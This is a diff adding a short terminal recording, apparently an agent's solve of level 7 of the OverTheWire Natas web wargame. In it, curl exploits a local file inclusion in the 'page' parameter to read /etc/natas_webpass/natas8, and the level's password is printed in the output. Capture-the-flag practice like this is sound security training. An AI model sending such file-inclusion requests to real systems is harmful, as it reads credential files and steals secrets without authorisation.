@@ -1,0 +1,5 @@
+{"version":3,"term":{"cols":100,"rows":32},"timestamp":1793469398,"idle_time_limit":2.0,"command":"python3 -I /home/claude/tools/ptyrun_sh.py /home/claude/solves/natas/L7.sh","title":"Natas L7 solve","env":{"SHELL":"/bin/bash"}}
+[0.012, "o", "$ curl -s -u natas7:<pw> http://natas7.natas.labs.overthewire.org/    # hint: /etc/natas_webpass/natas8\r\r\n"]
+[1.375, "o", "hint: password for webuser natas8 is in /etc/natas_webpass/natas8 -->\r\r\n$ curl -s -u natas7:<pw> \"http://natas7.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8\"\r\r\n"]
+[0.753, "o", "ugXL95KQmUAJJj6bMezOlBNDyI9Imwkc\r\r\n\r\r\n"]
+[0.002, "x", "0"]
